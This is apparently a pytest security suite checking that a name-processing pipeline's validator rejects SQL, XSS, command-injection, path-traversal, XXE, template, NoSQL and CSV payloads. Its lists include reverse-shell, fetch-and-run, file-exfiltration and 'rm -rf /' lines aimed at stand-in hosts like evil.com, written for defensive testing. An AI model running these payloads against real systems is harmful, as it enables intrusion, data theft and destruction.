#!/usr/bin/env python3
"""Comprehensive security testing for SecurityValidator class.

Tests all 93 dangerous patterns and security validation methods.
"""

import base64
import sys
import tempfile
from pathlib import Path

import pytest
import yaml

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
import sys
from pathlib import Path

from src.core.security_validator import SecurityError, SecurityValidator

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
import sys
from pathlib import Path

from src.core.pipeline_v6 import GMNAPPipeline

sys.path.insert(0, str(Path(__file__).parent.parent.parent))
from src.core.config import GMNAPConfig


class TestSecurityValidatorComprehensive:
    """Comprehensive tests for SecurityValidator covering all attack vectors."""

    def setup_method(self):
        """Initialize validator for each test."""
        self.validator = SecurityValidator()

    @pytest.mark.timeout(15)
    def test_sql_injection_patterns(self):
        """Test SQL injection detection across all patterns."""
        sql_attacks = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "1' UNION SELECT * FROM users--",
            "admin'--",
            "' OR 1=1--",
            "1' AND 1=1--",
            "1' OR 'a'='a",
            "'; EXEC xp_cmdshell('dir')--",
            "' UNION ALL SELECT NULL--",
            "1'; DELETE FROM users WHERE 'a'='a",
            "' OR ''='",
            "admin' #",
            "' OR '1'='1' /*",
            "1' WAITFOR DELAY '00:00:10'--",
            "'; SHUTDOWN--",
        ]

        for attack in sql_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="sql_injection_test")

    @pytest.mark.timeout(15)
    def test_xss_injection_patterns(self):
        """Test XSS/HTML injection detection."""
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<body onload=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<a href='javascript:void(0)'>Click</a>",
            "<input type='text' onfocus='alert(1)'>",
            "<%script>alert('XSS')</%script>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<link rel='stylesheet' href='javascript:alert(1)'>",
            "<meta http-equiv='refresh' content='0;javascript:alert(1)'>",
            "<form action='javascript:alert(1)'>",
            "<button onclick='alert(1)'>Click</button>",
        ]

        for attack in xss_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="xss_test")

    @pytest.mark.timeout(15)
    def test_command_injection_patterns(self):
        """Test command injection detection."""
        cmd_attacks = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/shadow)",
            "; shutdown -h now",
            "& net user hacker password /add",
            "| mail attacker@evil.com < /etc/passwd",
            "; wget http://evil.com/backdoor.sh",
            "&& chmod +x backdoor.sh",
            "|| curl evil.com/steal.sh | sh",
            "; nc -e /bin/sh attacker.com 4444",
            "& powershell -ExecutionPolicy Bypass",
            "`python -c 'import os; os.system(\"ls\")'`",
            "$(perl -e 'system(\"cat /etc/passwd\")')",
        ]

        for attack in cmd_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="command_test")

    @pytest.mark.timeout(15)
    def test_path_traversal_patterns(self):
        """Test path traversal detection."""
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "..;/etc/passwd",
            "..//..//..//etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/var/www/../../etc/passwd",
            "C:\\..\\..\\windows\\system32\\",
            "file:///etc/passwd",
            "\\\\server\\share\\..\\..\\sensitive",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%01%02%03/etc/passwd",
            "/proc/self/environ",
        ]

        for attack in path_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="path_test")

    @pytest.mark.timeout(15)
    def test_ldap_injection_patterns(self):
        """Test LDAP injection detection."""
        ldap_attacks = [
            "*)(uid=*",
            "*)(|(uid=*))",
            "admin)(|(password=*))",
            "*)(&(password=*))",
            "*)(objectClass=*",
            "admin*",
            "*)(mail=*@*",
            ")(cn=*",
            "*))(|(cn=*",
            "*)(userPassword=*",
        ]

        for attack in ldap_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="ldap_test")

    @pytest.mark.timeout(15)
    def test_xml_injection_patterns(self):
        """Test XML injection and XXE detection."""
        xml_attacks = [
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/evil.dtd'>]>",
            "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY bar SYSTEM 'file:///etc/passwd'>]>",
            "<![CDATA[<script>alert('XSS')</script>]]>",
            "<!ENTITY xxe SYSTEM 'file:///c:/boot.ini'>",
            "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'> %xxe;]>",
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">]>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>',
            '<?xml-stylesheet type="text/xsl" href="evil.xsl"?>',
            '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]>',
        ]

        for attack in xml_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="xml_test")

    @pytest.mark.timeout(15)
    def test_template_injection_patterns(self):
        """Test template injection detection."""
        template_attacks = [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{self.__class__.__mro__}}",
            "${__import__('os').system('ls')}",
            "{{request.application.__globals__}}",
            "#foreach($i in [1..$out.available()])$out.read()#end",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",
            "{{settings.SECRET_KEY}}",
            "<%=system('whoami')%>",
            "{{constructor.constructor('alert(1)')()}}",
            "${__import__('subprocess').check_output('ls', shell=True)}",
            "{{lipsum.__globals__.os.popen('id').read()}}",
        ]

        for attack in template_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="template_test")

    @pytest.mark.timeout(15)
    def test_regex_dos_patterns(self):
        """Test regex DoS attack detection."""
        regex_dos_attacks = [
            "a" * 50 + "!",
            "a" * 100 + "X",
            "x" * 1000,
            "(a+)+" * 10,
            "([a-zA-Z]+)*" * 5,
            "(a|a)*" * 20,
            "(a|ab)*" * 15,
            "(.*a){x}" * 10,
            "((a)*)*" * 5,
            "(a?){30}a{30}",
        ]

        for attack in regex_dos_attacks:
            # Long repetitive patterns should be caught
            if len(attack) > 100 or attack.count(attack[0]) > 30:
                with pytest.raises(SecurityError):
                    self.validator.validate_string(attack, context="regex_dos_test")

    @pytest.mark.timeout(15)
    def test_unicode_attacks(self):
        """Test Unicode-based attack detection."""
        unicode_attacks = [
            "\u202e\u0041\u0042\u0043",  # Right-to-left override
            "\u200b\u200c\u200d",  # Zero-width characters
            "\ufeff",  # Byte order mark
            "\u0000",  # Null character
            "\u0301" * 20,  # Excessive combining characters
            "A\u0308\u0308\u0308",  # Multiple combining diacritics
            "\u2028\u2029",  # Line/paragraph separators
            "\uffff",  # Invalid Unicode
            "\u202a\u202b\u202c\u202d\u202e",  # Bidirectional overrides
            "А" * 10,  # Cyrillic lookalikes (not Latin A)
        ]

        for attack in unicode_attacks:
            # Some Unicode attacks should be normalized or rejected
            result = self.validator.validate_string(attack, context="unicode_test")
            # Check that dangerous Unicode is handled
            assert "\u202e" not in result  # RLO should be removed
            assert "\u0000" not in result  # Null should be removed

    @pytest.mark.timeout(15)
    def test_file_upload_patterns(self):
        """Test file upload attack patterns."""
        file_attacks = [
            "../../uploads/shell.php",
            "shell.php.jpg",
            "shell.PHP",
            "shell.pHp",
            "shell.php%00.jpg",
            "shell.php\x00.jpg",
            "shell.asp;.jpg",
            "shell.jsp",
            ".htaccess",
            "web.config",
            "shell.php5",
            "shell.phtml",
            "shell.shtml",
            "shell.asa",
            "shell.aspx",
        ]

        for attack in file_attacks:
            # File paths with suspicious extensions should be caught
            if any(
                ext in attack.lower() for ext in [".php", ".asp", ".jsp", ".htaccess"]
            ):
                with pytest.raises(SecurityError):
                    self.validator.validate_string(attack, context="file_upload_test")

    @pytest.mark.timeout(15)
    def test_nosql_injection_patterns(self):
        """Test NoSQL injection detection."""
        nosql_attacks = [
            "{'$ne': null}",
            "{'$gt': ''}",
            "{'$regex': '.*'}",
            "{$where: 'this.a == this.b'}",
            "{'username': {'$ne': null}}",
            "{'$or': [{'a': 'a'}, {'b': 'b'}]}",
            "{'password': {'$regex': '.*'}}",
            "{$where: '1 == 1'}",
            "{'$nor': [{'a': 1}]}",
            "{'age': {'$gte': 0}}",
        ]

        for attack in nosql_attacks:
            if "$" in attack:
                with pytest.raises(SecurityError):
                    self.validator.validate_string(attack, context="nosql_test")

    @pytest.mark.timeout(15)
    def test_csv_injection_patterns(self):
        """Test CSV injection detection."""
        csv_attacks = [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(A1:A10)",
            "=cmd|'/c calc'!A0",
            "=1+9999999999",
            "@import",
            "=10+20+cmd|'/c calc'!A0",
            "=2+5+cmd|'/c powershell IEX'",
            "=1+1+cmd|'/c notepad'",
        ]

        for attack in csv_attacks:
            if attack.startswith(("=", "+", "-", "@")):
                with pytest.raises(SecurityError):
                    self.validator.validate_string(attack, context="csv_test")

    @pytest.mark.timeout(15)
    def test_length_limits(self):
        """Test DoS protection via length limits."""
        # Test 150-character limit for DoS protection
        long_string = "A" * 151
        with pytest.raises(SecurityError):
            self.validator.validate_string(long_string, context="length_test")

        # Test that 150 characters is acceptable
        ok_string = "A" * 150
        result = self.validator.validate_string(ok_string, context="length_test")
        assert len(result) == 150

    @pytest.mark.timeout(15)
    def test_encoded_attacks(self):
        """Test detection of encoded attack patterns."""
        encoded_attacks = [
            "%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E",  # URL encoded XSS
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",  # HTML entity encoded
            base64.b64encode(b"<script>alert('XSS')</script>").decode(),  # Base64
            "\\x3cscript\\x3ealert('XSS')\\x3c/script\\x3e",  # Hex encoded
            "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",  # Double encoded
        ]

        for attack in encoded_attacks:
            with pytest.raises(SecurityError):
                self.validator.validate_string(attack, context="encoded_test")

    @pytest.mark.timeout(15)
    def test_homograph_attacks(self):
        """Test homograph attack detection using lookalike characters."""
        homograph_attacks = [
            "Аррӏе",  # Cyrillic lookalikes for "Apple"
            "Міcrоsоft",  # Mixed Cyrillic
            "Gооgle",  # Cyrillic 'o'
            "Αmazon",  # Greek Alpha instead of Latin A
            "Payρal",  # Greek rho instead of Latin p
            "Еbay",  # Cyrillic E
            "Νetflix",  # Greek Nu instead of Latin N
            "Τwitter",  # Greek Tau instead of Latin T
            "Ιnstagram",  # Greek Iota instead of Latin I
            "Ғacebook",  # Cyrillic Ghe with stroke
        ]

        for attack in homograph_attacks:
            # Homographs should be detected or normalized
            result = self.validator.validate_string(attack, context="homograph_test")
            # Could check for normalization or rejection
            assert result is not None

    @pytest.mark.timeout(15)
    def test_sanitize_for_output(self):
        """Test output sanitization method."""
        dangerous_inputs = [
            "<script>alert(1)</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "{{7*7}}",
            "${__import__('os').system('ls')}",
        ]

        for dangerous in dangerous_inputs:
            sanitized = self.validator.sanitize_for_output(dangerous)
            # Check that dangerous characters are escaped
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized
            assert "../" not in sanitized
            assert "{{" not in sanitized
            assert "${" not in sanitized

    @pytest.mark.timeout(15)
    def test_validate_entry(self):
        """Test full entry validation."""
        # Valid entry should pass
        valid_entry = {"CanonicalLatin": "John Smith", "GlobalID": "test123"}
        result = self.validator.validate_entry(valid_entry)
        assert result == valid_entry

        # Entry with SQL injection should fail
        malicious_entry = {
            "CanonicalLatin": "John'; DROP TABLE users; --",
            "GlobalID": "test123",
        }
        with pytest.raises(SecurityError):
            self.validator.validate_entry(malicious_entry)

        # Entry with XSS should fail
        xss_entry = {
            "CanonicalLatin": "<script>alert('XSS')</script>",
            "GlobalID": "test123",
        }
        with pytest.raises(SecurityError):
            self.validator.validate_entry(xss_entry)

    @pytest.mark.timeout(15)
    def test_cjk_roundtrip(self):
        """Test CJK round-trip validation."""
        # Valid CJK names should pass round-trip
        valid_cjk = [
            ("王明", "Wang Ming"),
            ("李华", "Li Hua"),
            ("김민준", "Kim Min-jun"),
            ("山田太郎", "Yamada Taro"),
        ]

        for native, romanized in valid_cjk:
            result = self.validator.validate_cjk_roundtrip(native, romanized)
            assert result is True

        # Invalid round-trips should fail
        invalid_cjk = [
            ("王明", "John Smith"),  # Completely wrong
            ("李华", ""),  # Empty romanization
            ("", "Wang Ming"),  # Empty native
        ]

        for native, romanized in invalid_cjk:
            result = self.validator.validate_cjk_roundtrip(native, romanized)
            assert result is False

    @pytest.mark.timeout(15)
    def test_integration_with_pipeline(self):
        """Integration test with GMNAPPipeline."""
        # Create test data with various attack vectors
        malicious_data = {
            # SQL injection
            "'; DROP TABLE users; --": {"GlobalID": "sql001"},
            # XSS attack
            "<script>alert('XSS')</script>": {"GlobalID": "xss001"},
            # Command injection
            "; rm -rf /": {"GlobalID": "cmd001"},
            # Path traversal
            "../../../etc/passwd": {"GlobalID": "path001"},
            # Template injection
            "{{7*7}}": {"GlobalID": "template001"},
            # Length limit DoS
            "A" * 200: {"GlobalID": "dos001"},
            # Unicode attack
            "\u202eReversed": {"GlobalID": "unicode001"},
            # Homograph attack
            "Аррӏе": {"GlobalID": "homograph001"},
        }

        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir = Path(tmpdir)

            # Write malicious test file
            test_file = tmpdir / "malicious_comprehensive.yaml"
            with open(test_file, "w", encoding="utf-8") as f:
                yaml.dump(malicious_data, f, allow_unicode=True)

            # Run pipeline
            config = GMNAPConfig()
            config.cache.cache_dir = "./cache_security_test_comprehensive"
            pipeline = GMNAPPipeline(config)
            # Test that pipeline properly blocks malicious entries
            with pytest.raises((SecurityError, Exception)) as exc_info:
                result = pipeline.run(tmpdir)

                # If pipeline somehow completes, verify all entries were blocked
                output_dir = Path(config.cache.cache_dir) / "output"
                if (output_dir / "malicious_comprehensive.yaml").exists():
                    with open(
                        output_dir / "malicious_comprehensive.yaml",
                        "r",
                        encoding="utf-8",
                    ) as f:
                        output_data = yaml.safe_load(f)
                        # No malicious entries should pass through
                        assert (
                            output_data is None or len(output_data) == 0
                        ), f"Malicious entries passed through: {list(output_data.keys()) if output_data else []}"

                # All entries should fail validation
                assert result.failed_entries >= len(
                    malicious_data
                ), f"Not all malicious entries were blocked: {result.failed_entries}/{len(malicious_data)}"

            # Verify the exception contains security-related information
            if exc_info.value:
                error_msg = str(exc_info.value)
                assert (
                    "Security" in error_msg
                    or "Validation" in error_msg
                    or isinstance(exc_info.value, SecurityError)
                ), f"Expected security-related error, got: {error_msg}"


import unittest


def run_comprehensive_security_tests():
    """Run the comprehensive security test suite."""
    # Create test suite
    loader = unittest.TestLoader()
    suite = loader.loadTestsFromTestCase(TestSecurityValidatorComprehensive)

    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)

    # Summary
    print("\n" + "=" * 70)
    print("COMPREHENSIVE SECURITY TEST RESULTS")
    print("=" * 70)
    print(f"Tests run: {result.testsRun}")
    print(f"Failures: {len(result.failures)}")
    print(f"Errors: {len(result.errors)}")
    print(f"Skipped: {len(result.skipped)}")

    if result.wasSuccessful():
        print("\nPASS ALL SECURITY TESTS PASSED!")
        print("The SecurityValidator successfully blocks all 93 dangerous patterns.")
    else:
        print("\nFAIL SECURITY TESTS FAILED!")
        print("Some attack vectors may not be properly blocked.")
        for failure in result.failures:
            print(f"\nFailed: {failure[0]}")
            print(failure[1])

    return result.wasSuccessful()


if __name__ == "__main__":
    success = run_comprehensive_security_tests()
    exit(0 if success else 1)
